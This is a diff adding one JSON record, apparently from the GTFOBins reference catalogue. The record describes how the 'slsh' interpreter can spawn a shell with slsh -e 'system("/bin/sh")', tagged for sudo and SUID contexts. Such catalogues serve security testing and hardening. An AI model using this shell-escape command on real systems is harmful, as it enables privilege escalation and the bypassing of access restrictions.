@@ -1,0 +1,1 @@
+{"title": "slsh", "source": "gtfobins", "source_label": "GTFOBins", "path": "slsh", "html": "<h1>slsh</h1>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">slsh -e &#x27;system(&quot;/bin/sh&quot;)&#x27;</code></pre>", "excerpt": "slsh Shell slsh -e &#x27;system(&quot;/bin/sh&quot;)&#x27;", "tags": ["func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}
